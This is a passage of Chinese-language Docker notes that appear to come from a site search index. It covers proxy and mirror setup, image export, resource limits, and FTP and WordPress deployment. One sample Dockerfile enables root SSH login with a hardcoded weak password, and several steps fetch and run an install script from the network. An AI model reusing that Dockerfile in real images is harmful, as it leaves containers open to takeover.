https://docs.docker.com/registry/spec/api/ \u5217\u51fa\u6240\u6709\u955c\u50cf\uff1a /v2/_catalog \u5217\u51fa\u6307\u5b9a\u955c\u50cf\u7684\u6240\u6709\u6807\u7b7e\uff1a /v2/<name>/tags/list \u914d\u7f6edocker pull\u4f7f\u7528\u4ee3\u7406 \u00b6 \u5b98\u65b9\u6587\u6863\uff1a https://docs.docker.com/config/daemon/systemd/#httphttps-proxy mkdir - p / etc / systemd / system / docker . service . d vi / etc / systemd / system / docker . service . d / http - proxy . conf systemctl daemon - reload systemctl restart docker systemctl show -- property = Environment docker [Service] Environment = \"HTTP_PROXY=http://proxy.example.com:80\" Environment = \"HTTPS_PROXY=https://proxy.example.com:443\" Environment = \"NO_PROXY=localhost,127.0.0.1,docker-registry.example.com,.corp\" \u914d\u7f6edocker daemon\u9000\u51fa\u65f6\u4e0d\u81ea\u52a8\u5173\u95ed\u5bb9\u5668 \u00b6 \u53c2\u8003\uff1a https://docs.docker.com/config/containers/live-restore/ # vi /etc/docker/daemon.json { \"live-restore\" : true } # systemctl reload docker","title":"Docker"},{"location":"Docker/#_1","text":"IMAGE = mysql docker save $ IMAGE | 7 z a - si $ IMAGE . tar . 7 z 7 z x - so $ IMAGE . tar . 7 z | docker load","title":"\u642c\u8fd0\u955c\u50cf"},{"location":"Docker/#docker","text":"curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun","title":"\u5b89\u88c5Docker"},{"location":"Docker/#myubuntu","text":"@TAG \u65f6\u533a timezone \u7b80\u5355\u5730\u5c06Docker\u5f53\u6210\u865a\u62df\u673a\u6765\u4f7f\u7528\u7684\u8bdd\uff0c\u81ea\u7136\u8981\u51c6\u5907\u4e2a\u597d\u7528\u7684\u57fa\u7840\u955c\u50cf\u54af \u57fa\u4e8e\u76ee\u524d\u6700\u65b0\u7684ubuntu18.04\uff0c\u914d\u7f6eapt\u6e90\u3001pip\u6e90\u3001\u65f6\u533a\u3001ssh\u5141\u8bb8\u5bc6\u7801\u767b\u5f55 Dockerfile: FROM ubuntu : 18.04 RUN sed - i 's/security.ubuntu.com/mirrors.aliyun.com/g' / etc / apt / sources . list && \\ sed - i 's/archive.ubuntu.com/mirrors.aliyun.com/g' / etc / apt / sources . list # \u4fee\u6539apt\u6e90 RUN apt update && apt install - y ssh curl wget net - tools iputils - ping netcat python3 - pip python - pip nano vim tzdata screen psmisc RUN ln - sf / usr / share / zoneinfo / Asia / Shanghai / etc / localtime # \u4fee\u6539\u65f6\u533a RUN mkdir - p ~/ . pip && echo '[global]\\nindex-url = http://pypi.doubanio.com/simple/\\n[install]\\ntrusted-host=pypi.doubanio.com\\n' > ~/ . pip / pip . conf RUN sed - i 's/prohibit-password/yes/g' / etc / ssh / sshd_config && sed - i 's/#PermitRootLogin/PermitRootLogin/g' / etc / ssh / sshd_config # \u5141\u8bb8root\u7528\u6237\u5bc6\u7801\u767b\u5f55 RUN echo root : badpassword | chpasswd # \u8bb0\u5f97\u4fee\u6539\u8fd9\u91cc\u7684\u5bc6\u7801 ADD run . sh / RUN chmod + x / run . sh CMD / run . sh run.sh: 1 2 3 4 #!/bin/bash service ssh start # \u5728\u5bb9\u5668\u5185\u5b89\u88c5\u4e86mysql\u7b49\u4e4b\u540e\u53ef\u4ee5\u5728run.sh\u8fd9\u91cc\u6dfb\u52a0\u76f8\u5e94\u7684\u542f\u52a8\u547d\u4ee4 sleep infinity build\u547d\u4ee4\uff1a docker build -t myubuntu18 .","title":"myubuntu \u57fa\u7840\u955c\u50cf"},{"location":"Docker/#install","text":"\u5efa\u8bae\u53c2\u89c1 \u5982\u4f55\u7ffb\u5899 \uff0c\u90e8\u7f72http proxy \u5b89\u88c5\u4e4b\u524d\uff0c\u5efa\u8bae\u4fee\u6539apt\u6e90 \u5b89\u88c5\u4e4b\u524d\uff0c\u6216\u8bb8\u8981\u5bf9\u5185\u6838\u5347\u7ea7\uff0c\u5982\u679c\u6267\u884c\u5b89\u88c5\u811a\u672c\u53d1\u51fa\u4e86\u5bf9aufs\u7684\u8b66\u544a\uff0c\u8bf7\u5148\u770b\u4e0b\u9762\u7684 \u89e3\u51b3aufs\u7684\u95ee\u9898 \u5b89\u88c5\u547d\u4ee4\uff1a curl -fsSL get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun \u5176\u4e2d\u6700\u540e\u4e00\u6b65\u7684apt-get install docker-engine\u8017\u65f6\u8f83\u957f\uff0c\u770b\u8d77\u6765\u5f88\u50cf\u5361\u6b7b\uff0c\u9700\u8981\u8010\u5fc3\u7b49\u5f85 \u5b89\u88c5\u540e\u6267\u884cdocker version\uff0c\u6ca1\u6709\u62a5\u9519\u5373\u53ef","title":"Install \u5b89\u88c5"},{"location":"Docker/#aufs","text":"apt-get install lxc wget bsdtar curl apt-get install linux-image-extra-$(uname -r) modprobe aufs","title":"\u89e3\u51b3aufs\u7684\u95ee\u9898"},{"location":"Docker/#_2","text":"\u5728\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u524d\uff0c\u8bf7\u68c0\u67e5docker\u7684\u7248\u672c\uff1a docker -v \u5982\u679c\u4f60\u7684docker\u7248\u672c\u4e3a1.6.2,\u8bf7\u53c2\u8003\u4e0b\u65b9 \u5378\u8f7ddocker","title":"\u52a0\u901f\u955c\u50cf\u4e0b\u8f7d"},{"location":"Docker/#_3","text":"sudo mkdir - p / etc / docker sudo tee / etc / docker / daemon . json <<- 'EOF' { \"registry-mirrors\" : [ \"https://h0kyslzs.mirror.aliyuncs.com\" ] } EOF sudo systemctl daemon - reload sudo systemctl restart docker \u53e6\u5916\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528USTC\u7684\u955c\u50cf\u6e90\uff1a\u53c2\u8003 https://lug.ustc.edu.cn/wiki/mirrors/help/docker","title":"\u5efa\u8bae\u4f7f\u7528\u963f\u91cc\u4e91\u7684\u955c\u50cf\u6e90"},{"location":"Docker/#docker_1","text":"\u5982\u679c\u4f60\u7684docker\u662f\u4f7f\u7528apt-get install docker.io\u5b89\u88c5\u7684\uff0c\u5148\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u5378\u8f7d\uff1a apt - get remove docker . io apt - get autoremove rm - rf / var / lib / docker \u7136\u540e\u5c31\u53ef\u4ee5\u6267\u884c\u5b89\u88c5\u547d\u4ee4\u4e86","title":"Docker\u65e7\u7248\u672c\u5378\u8f7d"},{"location":"Docker/#ip","text":"@TAG getip alias getip=\"docker inspect --format ' {{ .NetworkSettings.IPAddress }} ' \" getip \u5bb9\u5668\u540d\u79f0 \u8fd9\u79cd\u65b9\u6848\u5bf9macvlan\u7684\u5bb9\u5668\u4e0d\u9002\u7528\uff0c\u53c2\u89c1 \u83b7\u53d6macvlan\u5bb9\u5668\u7684IP","title":"\u83b7\u5f97\u5bb9\u5668\u7684ip"},{"location":"Docker/#_4","text":"","title":"\u5bfc\u51fa\u5bfc\u5165"},{"location":"Docker/#-save","text":"\u7531\u4e8e\u7f51\u7edc\u5e26\u5bbd(\u6d41\u91cf)\u5f80\u5f80\u662f\u74f6\u9888\u8d44\u6e90\uff0c\u6240\u4ee5\u4ea7\u751f\u66f4\u5c0f\u7684\u538b\u7f29\u6587\u4ef6\u5f88\u6709\u5fc5\u8981\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u751f\u6210 tar.7z \u6587\u4ef6\uff1a apt-get install -y p7zip-full docker save \u955c\u50cf\u540d\u79f0 | 7z a -si \u5bfc\u51fa\u6587\u4ef6\u540d.tar.7z \u8fd9\u662f\u751f\u6210tar.gz\u6587\u4ef6\uff1a docker save \u955c\u50cf\u540d\u79f0 | gzip >\u5bfc\u51fa\u6587\u4ef6\u540d.tar.gz","title":"\u642c\u8fd0\u955c\u50cf--save\u5bfc\u51fa\u955c\u50cf"},{"location":"Docker/#-load","text":"\u5982\u679c\u662f tar.7z \u6587\u4ef6\uff0c\u9700\u8981\u8c03\u7528 7z \u547d\u4ee4\u89e3\u538b\uff1a 7 z x - so \u6587\u4ef6\u540d . tar . 7 z | docker load \u5982\u679c\u662f tar.gz \u6587\u4ef6\uff0c\u53ef\u4ee5\u76f4\u63a5\u8f7d\u5165\uff1a docker load < \u6587\u4ef6\u540d . tar . gz","title":"\u642c\u8fd0\u955c\u50cf--load\u8f7d\u5165\u955c\u50cf"},{"location":"Docker/#export","text":"\u76f4\u63a5\u5bfc\u51fa\u5bb9\u5668\u5e76\u4e0d\u5e38\u7528\uff0c\u5efa\u8bae docker commit \u5bb9\u5668\u540d\u79f0 \u4fdd\u5b58\u6210\u7684\u955c\u50cf\u540d\u79f0 \uff0c\u7136\u540e\u5bfc\u51fa\u955c\u50cf \u5bfc\u51fa\u5bb9\u5668\u5f97\u5230\u7684\u662ftar\u6587\u4ef6\uff0c\u6ca1\u6709\u8fdb\u884c\u538b\u7f29\uff0c\u6211\u4eec\u9700\u8981\u624b\u52a8\u6267\u884c\u538b\u7f29 docker export \u5bb9\u5668\u7684\u540d\u79f0\u6216 ID | gzip > \u5bfc\u51fa\u6587\u4ef6\u540d . tar . gz","title":"Export\u5bfc\u51fa\u5bb9\u5668 \u5e76\u4e0d\u5e38\u7528"},{"location":"Docker/#import","text":"\u867d\u7136\u4e0a\u4e00\u6b65\u6211\u4eec\u538b\u7f29\u4e86\uff0c\u4f46docker\u53ef\u4ee5\u76f4\u63a5import\uff0c\u4e0d\u9700\u8981\u7528gunzip docker import \u6587\u4ef6\u540d","title":"Import\u5bfc\u5165\u5bb9\u5668"},{"location":"Docker/#iptables-failed-no-chiantargetmatch-by-that-name","text":"\u5982\u679cdocker\u5b89\u88c5\u7684\u65f6\u5019\u6ca1\u6709\u81ea\u52a8\u628a\u9700\u8981\u7684\u89c4\u5219\u94fe\u52a0\u4e0a\uff0c\u53ef\u4ee5\u624b\u52a8\u6dfb\u52a0 iptables -t nat -N DOCKER iptables -t filter -N DOCKER \u9644\uff1a\u5982\u679c\u9700\u8981\u5220\u9664\u94fe\u6761\uff0c\u53ef\u4ee5\u7528 iptables-save \u5bfc\u51fa\u540e\u624b\u52a8\u7f16\u8f91\u540e iptables-restore","title":"\u89e3\u51b3iptables failed - No chian/target/match by that name"},{"location":"Docker/#docker_2","text":"\u5f53\u955c\u50cf\u591a\u4e86\u8d77\u6765\u7684\u65f6\u5019\uff0c/var/lib\u6240\u5728\u7684\u78c1\u76d8\u5206\u533a\u5f88\u53ef\u80fd\u88ab\u5360\u6ee1\uff0c\u8fd9\u65f6\u5019\u8981\u8003\u8651\u8fc1\u79fb\u5230\u5176\u4ed6\u786c\u76d8\uff0c\u6b64\u5904\u4ee5\u8fc1\u79fb\u5230 /home/docker \u4e3a\u4f8b\u8bf4\u660e # \u9996\u5148\u8bb0\u5f97\u5173\u95ed\u670d\u52a1 service docker stop mv /var/lib/docker /home/ # \u7136\u540e\u4fee\u6539\u670d\u52a1\u914d\u7f6e\u6587\u4ef6/etc/default/docker\uff0c\u6b64\u5904\u5efa\u8bae\u624b\u52a8vim\u7f16\u8f91\uff0c\u5728\u542f\u52a8\u53c2\u6570\u4e2d\u52a0\u5165\u8fd9\u4e2a\uff1a # --graph='/home/docker' echo -e \"\\nDOCKER_OPTS=\\\"--graph='/home/docker'\\\"\" >> /etc/default/docker","title":"\u8fc1\u79fbDocker\u6587\u4ef6\u5939\u5230\u5176\u4ed6\u786c\u76d8"},{"location":"Docker/#debianifconfigkillall","text":"apt - get install net - tools psmisc","title":"\u89e3\u51b3debian\u7b49\u5bb9\u5668\u6ca1\u6709ifconfig,killall\u7684\u95ee\u9898"},{"location":"Docker/#_5","text":"@TAG user \u5b89\u5168\u6700\u4f73\u5b9e\u8df5 \u5728Dockerfile\u4e2d\u52a0\u5165 User nobody \u5bb9\u5668\u8fd0\u884c\u540eexec\u8fdb\u53bb\u9ed8\u8ba4\u662fnobody\u7528\u6237\uff0c\u5e76\u4e0d\u80fdsu\u5565\u7684\uff0c\u8fd9\u65f6\u5019exec\u9700\u8981\u5e26\u53c2\u6570-u\u8868\u793a\u7528\u6307\u5b9a\u7528\u6237\u8eab\u4efd\u8fdb\u5165\u5bb9\u5668\uff1a docker exec -i -t -u root \u5bb9\u5668\u540d\u79f0 /bin/bash","title":"\u8bbe\u7f6e\u5bb9\u5668\u4f4e\u6743\u9650\u7528\u6237\u8fd0\u884c"},{"location":"Docker/#etcresolvconfetchosts","text":"\u5728\u5bb9\u5668\u4e2d\u8fd9\u4e24\u4e2a\u6587\u4ef6\u662f\u4ee5mount\u5f62\u5f0f\u6302\u8f7d\u7684\uff0c\u4e0d\u80fdunmount\uff1b\u5373\u4f7f\u8fdb\u884c\u4fee\u6539\uff0c\u5bb9\u5668\u91cd\u542f\u540e\u4fee\u6539\u5c31\u4e22\u5931\u4e86 \u5176\u5b9e\u8fd9\u4e24\u4e2a\u6587\u4ef6\u5e94\u8be5\u5728\u5bb9\u5668\u521b\u5efa\u7684\u65f6\u5019\u6307\u5b9a\u53c2\u6570 --dns \u548c --add-host \u6765\u52a0\u4ee5\u63a7\u5236\uff1a docker run -d --dns 114.114.114.114 --add-host example.com:1.2.3.4 \u5bb9\u5668\u540d\u79f0","title":"\u8bbe\u7f6e\u5bb9\u5668/etc/resolv.conf\u548c/etc/hosts"},{"location":"Docker/#_6","text":"\u5f53\u5bb9\u5668\u662f\u5f00\u653e\u7ed9\u4e0d\u53ef\u4fe1\u57df\u7684\u65f6\u5019(\u5982\u90e8\u7f72\u4e00\u4e2aCTF\u7684pwn\u9898\u76ee)\uff0c\u867d\u7136\u5bb9\u5668\u9003\u90380-day\u6211\u4e5f\u6ca1\u529e\u6cd5\uff0c\u4f46\u9650\u5236\u4e00\u4e0b\u5bb9\u5668\u8d44\u6e90\u5360\u7528\u9632\u6b62\u6405\u5c4e\u4e5f\u662f\u5f88\u6709\u5fc5\u8981\u7684 --cpu-shares 512 --cpu-period=100000 --cpu-quota=50000 --memory 104857600 --ulimit=nofile=65536 --pids-limit=200 --blkio-weight=512 --restart=\"always\" \u6548\u679c\u7b80\u4ecb\uff1a\u5982\u4e0a\u914d\u7f6e\u6700\u591a\u5360\u7528 50% \u5355\u4e2a CPU \uff0c\u6700\u591a\u5360\u7528100MB\u7269\u7406\u5185\u5b58\uff0c\u5bb9\u5668\u5185\u8fdb\u7a0b\u6570\u76ee\u6700\u591a200\u4e2a --cpu-shares \u8868\u793a\u76f8\u5bf9\u5229\u7528\u5360\u6bd4\uff0c\u4e0d\u8bbe\u7f6e\u7684\u9ed8\u8ba4\u503c\u4e3a1024\uff0c\u5355\u4e2aCPU\u662f1024\uff0c\u53ea\u6709\u5f53\u5bb9\u5668\u8bd5\u56fe\u5360\u7528100%\u7684CPU\u65f6\u624d\u4f1a\u4f53\u73b0\u4f5c\u7528\uff0c\u4e3e\u4e2a\u4f8b\u5b50\uff1a From: http://blog.opskumu.com/docker-cpu-limit.html \u5047\u5982\u4e00\u4e2a 1core \u7684\u4e3b\u673a\u8fd0\u884c 3 \u4e2a container\uff0c\u5176\u4e2d\u4e00\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 1024\uff0c\u800c\u5176\u5b83 cpu-shares \u88ab\u8bbe\u7f6e\u6210 512\u3002\u5f53 3 \u4e2a\u5bb9\u5668\u4e2d\u7684\u8fdb\u7a0b\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u7684\u65f6\u5019\u300c\u5c1d\u8bd5\u4f7f\u7528 100% CPU \u5f88\u91cd\u8981\uff0c\u6b64\u65f6\u624d\u53ef\u4ee5\u4f53\u73b0\u8bbe\u7f6e\u503c\u300d\uff0c\u5219\u8bbe\u7f6e 1024 \u7684\u5bb9\u5668\u4f1a\u5360\u7528 50% \u7684 CPU \u65f6\u95f4\uff0c\u5176\u4ed6\u4e24\u4e2a\u5bb9\u5668\u5219\u53ea\u80fd\u5206\u522b\u5360\u7528\u5230 25% \u7684 CPU \u65f6\u95f4\u3002 \u5982\u679c\u4e3b\u673a\u662f 3core\uff0c\u8fd0\u884c 3 \u4e2a\u5bb9\u5668\uff0c\u4e24\u4e2a cpu-shares \u8bbe\u7f6e\u4e3a 512\uff0c\u4e00\u4e2a\u8bbe\u7f6e\u4e3a 1024\uff0c\u5219\u6b64\u65f6\u6bcf\u4e2a container \u90fd\u80fd\u5360\u7528\u5176\u4e2d\u4e00\u4e2a CPU \u4e3a 100%\u3002 --cpu-period \u8868\u793a\u6309\u591a\u5c11\u79d2\u5206\u7247\uff0c\u4f8b\u5982\u8bbe\u7f6e\u4e3a100000\u5c31\u662f\u6309100ms\u5206\u5272\uff0c\u540c\u65f6\u8bbe\u7f6e --cpu-quota \u4e3a50000\u5c31\u662f50ms\uff0c\u6548\u679c\u662f\u540c\u65f6\u53ea\u80fd\u4f7f\u75280.5\u4e2aCPU --memory \u9650\u5236\u5bb9\u5668\u4f7f\u7528\u7684\u7269\u7406\u5185\u5b58\uff0c\u5f53\u5bb9\u5668\u8d85\u51fa\u65f6\uff0c\u5176\u4e2d\u7684\u8fdb\u7a0b\u4f1a\u88abkill\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003http://blog.opskumu.com/docker-memory-limit.html --blkio-weight \u8868\u793aIO\u76f8\u5bf9\u6743\u91cd\uff0c\u8be6\u7ec6\u8bf7\u53c2\u8003 http://blog.opskumu.com/docker-io-limit.html","title":"\u5bb9\u5668\u9650\u5236\u53c2\u6570\u8bbe\u7f6e"},{"location":"Docker/#ftp","text":"@TAG vsftpd vsftpd\u7684\u914d\u7f6e\u771f\u662f\u8ba9\u4eba\u5934\u75bc\uff0c\u4e0d\u5982 docker search ftp \u4e00\u756a\uff0c\u7136\u540egoogle\u4e00\u4e0b\u627e\u5230\u5bf9\u5e94\u7684 Docker Hub\u9875\u9762 \u4f7f\u7528\u6b65\u9aa4\uff1a docker run -d --name ftpd_server -p 21:21 -p 30000-30009:30000-30009 -e \"PUBLICHOST=localhost\" -v /path/to/the_ftp_directory:/data stilliard/pure-ftpd:hardened docker exec -it ftpd_server /bin/bash #\u8fdb\u5165\u5bb9\u5668\u540e\u521b\u5efa\u7528\u6237 pure-pw useradd bob -f /etc/pure-ftpd/passwd/pureftpd.passwd -m -u ftpuser -d /data","title":"\u5feb\u901f\u90e8\u7f72ftp"},{"location":"Docker/#wordpress","text":"@TAG sub_filter \u60f3\u642d\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684blog\uff0c\u9009\u62e9\u73a9\u4e00\u73a9wordpress\u54af\uff0c\u8fd9\u91cc\u8bb0\u5f55\u4e00\u4e0b\u5b8c\u6574\u7684\u6d41\u7a0b\u548c\u9047\u5230\u7684\u95ee\u9898\u53ca\u89e3\u51b3\u65b9\u6848 \u6280\u672f\u76f8\u5173\uff1a Docker Nginx HTTPS \u76ee\u6807\uff1a \u5feb\u901f\u642d\u5efa\u4e00\u4e2a\u5168\u7ad9https\u7684wordpress\u7ad9\u70b9\uff0c\u57df\u540d\u4e3aexample.com","title":"\u5feb\u901f\u90e8\u7f72wordpress"},{"location":"Docker/#_7","text":"\u524d\u671f\u51c6\u5907:\u57df\u540d+vps \u6ce8\u518c\u57df\u540d \u5982\u679c\u9762\u5411\u56fd\u5185\u8bbf\u95ee\uff0c\u8fd8\u9700\u8981\u5907\u6848\u54af\uff1b\u522b\u5fd8\u4e86\u914d\u7f6eDNS\u89e3\u6790 \u4e70\u4e2avps\u670d\u52a1\u5668\uff0c\u5efa\u8bae\u9009\u62e9\u9999\u6e2fvps \u5b89\u88c5Docker\u548cNginx curl -fsSL https://get.docker.com -o get-docker.sh sh get-docker.sh --mirror Aliyun apt-get install -y nginx \u542f\u52a8\u4e00\u4e2amysql\u7684\u955c\u50cf\uff1a # Google\u641c\u7d22\u5173\u952e\u8bcd \"docker mysql\" docker run --name mysql -e MYSQL_ROOT_PASSWORD=\u8fd9\u91cc\u6539\u6210\u4f60\u60f3\u8bbe\u7f6e\u7684\u5bc6\u7801 -d mysql # Google\u641c\u7d22\u5173\u952e\u8bcd \"docker wordpress\" docker run --name wp --link mysql:mysql -p 6666:80 -d wordpress \u57df\u540dhttps\u8bc1\u4e66\u83b7\u53d6\u4ee5\u53ca\u542f\u7528https\u8bbf\u95ee\uff0c\u6b64\u90e8\u5206\u5177\u4f53\u89c1 Nginx.md \u4e2d \u83b7\u5f97Let's encrypt\u514d\u8d39https\u8bc1\u4e66 \u548c \u914d\u7f6e\u5b89\u5168\u7684https \u90e8\u5206 \u914d\u7f6eNginx\uff0c\u5b8c\u6574\u914d\u7f6e\u5982\u4e0b\uff1a server { server_name *. example . com example . com ; location /. well - known / acme - challenge { #\u8fd9\u662flet's encrypt\u7533\u8bf7\u8bc1\u4e66\u7684\u65f6\u5019\u7528\u5230\u7684\u76ee\u5f55 alias / tmp / acme / ; try_files $ uri = 404 ; } location / { rewrite ^ https : //$ host $ request_uri ? permanent ; } } server { server_name *. example . com example . com ; include https . conf ; access_log / var / log / nginx / example_access . log ; error_log / var / log / nginx / example_error . log ; ssl_certificate / home / keys / example . crt ; ssl_certificate_key / home / keys / example . key ; location / { proxy_pass http : // 127.0 . 0.1 : 6666 ; proxy_set_header Host $ host ; proxy_set_header Accept - Encoding \"\" ; #\u7981\u6b62\u540e\u7aef\u8fd4\u56degzip\u5185\u5bb9\uff0c\u4fdd\u8bc1\u80fd\u591f\u66ff\u6362 sub_filter_once off ; #\u591a\u6b21\u66ff\u6362 \u4e0d\u53ea\u662f\u66ff\u6362\u4e00\u6b21 sub_filter \"http://www.example.com\" \"https://www.example.com\" ; } }","title":"\u5b8c\u6574\u6d41\u7a0b\uff1a"},{"location":"Docker/#_8","text":"docker run\u7684\u65f6\u5019\u5fd8\u8bb0-p\u53c2\u6570 \u5efa\u8bae\u8fd8\u662f\u628a\u7aef\u53e3\u6620\u5c04\u51fa\u6765\uff0c\u5728\u5bb9\u5668\u91cd\u542f\u540e\u5bb9\u5668\u7684\u5185\u7f51IP\u662f\u4f1a\u53d1\u751f\u53d8\u5316\u7684\uff0c\u4e0d\u9002\u5408\u5c06172.17.0.*\u8fd9\u79cdIP\u5199\u5165nginx\u914d\u7f6e \u6b64\u65f6\u6211\u9009\u62e9\u4e86 docker rm -f \u5bb9\u5668ID \u5f3a\u5236\u5220\u6389\u5bb9\u5668\uff0c\u518d\u52a0\u4e0a-p\u53c2\u6570\u540e\u542f\u52a8 \u5168\u7ad9https \u867d\u7136\u6211\u7684https.conf\u4e2d\u5b9a\u4e49\u4e86HSTS\uff0c\u6d4f\u89c8\u5668\u4e5f\u786e\u5b9e\u4f1a\u628a\u6240\u6709\u7684\u8bf7\u6c42\u90fd\u81ea\u52a8\u7528https\u534f\u8bae\u8bbf\u95ee\uff0c\u4f46\u662f\u8fd8\u662f\u7531\u4e8eform\u7684action\u4e3ahttp\u534f\u8bae\u800c\u8b66\u544a\u4e0d\u5b89\u5168(\u5728Chrome\u5f00\u53d1\u4eba\u5458\u5de5\u5177\u7684Console\u770b\u5230)\uff0c\u4e5f\u6ca1\u6709\u5c0f\u7eff\u9501\u663e\u793a\u3002\u6240\u4ee5\u8981\u4fdd\u8bc1\u670d\u52a1\u5668\u8f93\u51fa\u7ed9\u6d4f\u89c8\u5668\u7684\u5185\u5bb9\u5c31\u662fhttps\u7684\u94fe\u63a5 \u4e00\u5f00\u59cb\u9009\u62e9\u4e86\u5b98\u65b9wordpress\u7684\u65b9\u6cd5(Google\u5173\u952e\u8bcd\u201dwordpress https\u201d)\uff0c\u7ed3\u679c\u5bfc\u81f4\u4e86\u4e0b\u6587\u7b2c\u4e09\u70b9\u7684\u6298\u817e \u6700\u7ec8\u9009\u62e9\u7684\u65b9\u6848\u662f\u5728nginx\u53cd\u5411\u4ee3\u7406\u7684\u65f6\u5019\u66ff\u6362\u6587\u672c\u5185\u5bb9\uff0c\u4f7f\u7528sub_filter\u8fd9\u4e2a\u6a21\u5757\u8fdb\u884c\u6587\u672c\u5185\u5bb9\u66ff\u6362 \u9047\u5230\u4e86\u95ee\u9898\uff0c\u8fd9\u4e2asub_filter\u4e0d\u8d77\u4f5c\u7528\uff0c(Google\u5173\u952e\u8bcd \u201csub_filter not working\u201d)\u539f\u56e0\u662f\u5bb9\u5668\u8fd4\u56de\u7684\u5185\u5bb9\u542f\u7528\u4e86gzip\uff0c\u65e0\u6cd5\u66ff\u6362\uff0c\u65b9\u6cd5\u662f\u52a0\u5165\u4e00\u884c\u914d\u7f6e\u7981\u6b62\u5bb9\u5668\u7684Apache\u4f7f\u7528gzip: proxy_set_header Accept-Encoding \u201c\u201d; \u53c2\u8003\uff1a http://stackoverflow.com/questions/31893211/http-sub-module-sub-filter-of-nginx-and-reverse-proxy-not-working \u7531\u4e8e\u5728\u540e\u53f0\u4fee\u6539\u4e86Wordpress Address\u548cSite Address\u6539\u4e3ahttps\u7684\u94fe\u63a5\uff0c\u5bfc\u81f4\u540e\u53f0\u65e0\u6cd5\u6253\u5f00\uff0c\u91cd\u5b9a\u5411\u6b7b\u5faa\u73af \u89e3\u51b3\u65b9\u6848\u662f\u8fdb\u5165mysql\u5bb9\u5668\u624b\u52a8\u4fee\u6539\uff0c\u628a\u8fdb\u884c\u7684\u4fee\u6539\u6539\u56de\u53bb \u95ee\u9898\u5728\u4e8e\u6211\u4e5f\u5e76\u4e0d\u77e5\u9053\u6539\u4e86\u5565\uff0c\u5728\u7ec8\u7aefmysql select * from wp_options; \u6709\u4e9b\u884c\u592a\u957f\u5bfc\u81f4\u5173\u952e\u5185\u5bb9\u5237\u5c4f\u800c\u8fc7\uff0c\u4e0d\u65b9\u4fbf\u67e5\u770b\u8868 \u6211\u7684\u65b9\u6cd5\u662f\u5148 mysqldump -p\u5bc6\u7801 wordpress >test.sql \uff0c\u518d\u7528nano\u6253\u5f00test.sql\uff0c\u7528Ctrl+W\u641c\u7d22https\uff08Google\u5173\u952e\u8bcd\u201dnano search\u201d\uff09\uff0c\u628a\u5bf9\u5e94\u7684\u5730\u65b9\u627e\u5230\u6539\u56dehttp\uff0c\u4fdd\u5b58\u540e\u7528 mysql -p\u5bc6\u7801 wordpress < test.sql \u5bfc\u5165\u6570\u636e\u5e93 \u5b8c\u4e8b~","title":"\u9047\u5230\u7684\u5751"},{"location":"Docker/#dockerfile-apt-get","text":"\u4e3a\u4e86\u8ba9 apt-get \u987a\u5229\u9759\u9ed8\u6267\u884c\uff0c\u9700\u8981\u914d\u7f6e\u73af\u5883\u53d8\u91cf\u9632\u6b62\u4ea4\u4e92\uff1a DEBIAN_FRONTEND=noninteractive apt-get install -y ...","title":"Dockerfile \u4e2d\u7684 apt-get"},{"location":"Docker/#dockerip","text":"\u8fd9\u91cc\u7684\u5185\u7f51\u4e0d\u662f\u53ea\u6709\u4e3b\u673a\u53ef\u4ee5\u8bbf\u95ee\u7684\u5bb9\u5668Docker\u5185\u7f51\uff0c\u800c\u662f\u4e3b\u673a\u63a5\u5165\u7684\u4f01\u4e1a\u5185\u7f51\u8fd9\u79cd\uff1b\u5982\u679c\u4f60\u80fd\u76f4\u63a5\u901a\u8fc7\u8bbe\u7f6eIP\u83b7\u5f97\u516c\u7f51IP\uff0c\u5f53\u7136\u6309\u7167\u8fd9\u4e2a\u65b9\u6cd5\u4e5f\u80fd\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP \u6ce8\u610f\uff1a\u6b64\u65b9\u6cd5Docker\u5bb9\u5668\u867d\u7136\u83b7\u5f97\u4e86\u548c\u4e3b\u673a\u5730\u4f4d\u76f8\u540c\u7684IP\uff0c\u4f46\u5bb9\u5668\u65e0\u6cd5\u4f7f\u7528\u4e3b\u673a\u7684IP\u4e0e\u4e3b\u673a\u901a\u8baf\uff0c\u4e3b\u673a\u597d\u50cf\u4e5f\u4e0d\u80fd\u8bbf\u95ee\u5bb9\u5668\u7684IP\uff0c\u8fd9\u662fLinux\u5185\u6838\u4e3a\u4e86\u9694\u79bb\u6027\u548c\u5b89\u5168\u6027\u505a\u51fa\u7684\u9650\u5236 \u53c2\u8003\uff1a \u4e0d\u7528\u7aef\u53e3\u8f6c\u53d1\u7ed9\u5bb9\u5668\u5206\u914d\u516c\u7f51IP\u5730\u5740 ASSIGN PUBLIC IP ADDRESS TO DOCKER CONTAINER WITHOUT PORT BINDING. Macvlan and IPvlan basics Docker Networking Tip \u2013 Macvlan driver PPT Docker Networking - Common Issues and Troubleshooting Techniques \u505a\u6cd5\u4e5f\u5f88\u7b80\u5355\uff0c\u9996\u5148\u521b\u5efa\u4e00\u4e2aMacvlan\u7c7b\u578b\u7684docker\u7f51\u7edc\uff0c\u7136\u540e\u5728\u521b\u5efa\u5bb9\u5668\u7684\u65f6\u5019\u52a0\u5165\u8fd9\u4e2a\u7f51\u7edc\u5e76\u6307\u5b9aIP/\u4e0d\u6307\u5b9a\u5219\u81ea\u52a8\u5206\u914d \u4f8b\u5b50\uff1a\u4e3b\u673a\uff08\u7f51\u5361eth0\uff09\u7684IP\u4e3a10.1.1.2\uff0c\u7f51\u5173\u4e3a10.1.1.1\uff0c\u4e3b\u673a\u6240\u5904\u7684IP\u6bb5\u662f10.1.1.1/24\uff0c\u5728\u8be5\u7f51\u6bb5\u5185\u4e3b\u673a\u53ef\u4ee5\u4efb\u610f\u83b7\u5f97IP\uff0c\u6211\u4eec\u5e0c\u671b\u5bb9\u5668\u5206\u914d\u572810.1.1.65~10.1.1.126\u4e4b\u95f4 \uff08\u5373 10.1.1.64/26\uff09 \u9644\uff1a \u8fd9\u662f\u4e00\u4e2a\u8f93\u5165Network 10.1.1.64/26\u8f6c\u6362\u4e3aHostMin 10.1.1.65~ HostMax 10.1.1.126\u7684\u8ba1\u7b97\u5668 docker network create - d macvlan - o macvlan_mode = bridge - o parent = eth0 